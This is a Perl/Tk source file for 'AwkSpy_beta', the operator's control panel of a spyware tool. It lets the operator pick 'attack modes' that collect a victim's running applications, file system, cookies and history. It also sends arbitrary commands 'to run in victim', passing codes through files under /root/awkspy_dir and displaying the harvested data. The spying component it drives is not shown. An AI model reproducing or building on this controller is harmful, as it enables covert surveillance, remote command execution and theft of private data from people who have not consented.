#!/usr/local/bin/perl
use Tk;
use strict;
use warnings;

my $mw =MainWindow->new(-width => '275', -height => '300' ,-relief => 'flat'
,-background=>'white');
$mw->title("AwkSpy_beta");

my $label2 = $mw->  Label(-text=>"Attack Mode",-background=>'white') -> place(-x=>10,-y=>20);
my $label = $mw->  Label(-text=>"Command",-background=>'white')  -> place(-x=>10,-y=>70);
#my $label = $mw -> Label(-text=>" ") -> pack();
#my $label = $mw -> Label(-text=>" ") -> pack();

my $v1;

my @v2=qw/Select Running_apps FileSystem Cookies History Ping/;
my $om=$mw->Optionmenu(-variable=>\$v1,-background=>'white',
-options => [@v2],-command => [sub{trigger(@_)}],)->place(-x=>100,-y=>15);


my $dth= $mw -> Button(-text => "Quit", -background=>'white',
-command =>\&exitProgam) -> place(-x=>215,-y=>265);
#my $ent_name= $mw -> Label(-text=>"Enter the comand:") -> pack();

my $ent_txt="kill 1000";
my $ent= $mw ->Entry(-textvariable => \$ent_txt,-background=>'white')->place(-x=>100,-y=>70);
#my $cmd= $mw -> Button(-background=>'white',-text => "command" ,
#-command =>(\&fin)) -> pack();

$mw->Button(-text => "Send", -command => 
            sub { 
              if($ent_txt) { print " sent";
              trigger("hello",$ent_txt);    $ent->insert('end',"  sent!");
              }

              else {print "enter command to run in victim!";}
})->place(-x=>150,-y=>125);

MainLoop;
      

sub exitProgam {
$mw->messageBox(-background=>'white',
-message=>"GNU General Publi License.\nAwkSpy 2013.\nFree to modify/redistribute.
\nBy impressport labs.\n");
exit;  }


sub trigger{

#open(FIFO,"/root/pipe1") or die "service unavailable";
#print FIFO "hello";

my $fds=0;
open(fds,'>/root/awkspy_dir/msd.txt');

if($_[0] eq "hello")
{
#print $_[1];
print fds "$_[1]\n";
}


if($_[0] eq "Running_apps") 
{#print "1";
print fds "1\n";

#my $a= `/root/awkspy_dir/spydata.txt`;
#print "$a";

my $metal=new MainWindow;
$metal->title("Victim's Running Apps");
my $text=$metal->Scrolled("Text",-background=>'white',-foreground=>'black',
-font=>['myfont','10'])->pack();

print "\nread data:\n";

#mkfifo reader process
#open(FIFO,'/root/sample');
#while(<FIFO>)
#{ print "this one:$_"; }
#close(FIFO);
open(hnd,'/root/awkspy_dir/knock.txt');
while(1)
{
my $sem=`cat /root/awkspy_dir/knock.txt`;
chomp($sem);
if($sem eq "1")
{
open(resd,'>/root/awkspy_dir/knock.txt'); print resd "0\n"; close(resd);
last;
}
}#eo w1
close(hnd);

open(fd,'/root/awkspy_dir/spydata.txt');
#my @file = <FILE>;

while(<fd>)
{$text->insert('end',$_);}
close(fd);

open(my $fd,'>/root/awkspy_dir/spydata.txt') || die('$!');
close(fd);

MainLoop;
}

if($_[0] eq "FileSystem") 
{
print fds "2\n";

my $metal=new MainWindow;
$metal->title("Victim's Running Apps");
my $text=$metal->Scrolled("Text",-background=>'white',-foreground=>'black',
-font=>['myfont','10'])->pack();

print "\nread data:\n";
open(hnd,'/root/awkspy_dir/knock.txt');

while(1)
{
my $sem=`cat /root/awkspy_dir/knock.txt`;
chomp($sem);
if($sem eq "1")
{
open(resd,'>/root/awkspy_dir/knock.txt'); print resd "0\n"; close(resd);
last;
}
}#eo w1
close(hnd);

open(fd,'/root/awkspy_dir/spydata.txt');
#my @file = <FILE>;

while(<fd>)
{$text->insert('end',$_);}
close(fd);
open(fd,'>/root/awkspy_dir/spydata.txt');
close(fd);
MainLoop;
}


if($_[0] eq "Cookies") 
{
print fds "3\n";
}

if($_[0] eq "Ping") 
{
print fds "5\n";
}


close(fds);
}#eo trigger

sub fin{}
